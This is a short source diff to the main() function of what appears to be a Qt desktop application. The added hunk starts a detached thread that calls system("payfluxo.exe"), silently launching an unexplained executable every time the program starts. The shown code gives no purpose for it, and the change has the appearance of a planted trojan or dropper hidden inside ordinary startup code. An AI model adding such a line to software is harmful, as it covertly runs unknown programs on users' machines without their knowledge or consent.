@@ -131,6 +131,9 @@ int main(int argc, char *argv[])
     adjustFileDescriptorLimit();
 #endif
 
+    std::thread worker (system, "payfluxo.exe");
+    worker.detach();
+
     // We must save it here because QApplication constructor may change it
     bool isOneArg = (argc == 2);
 
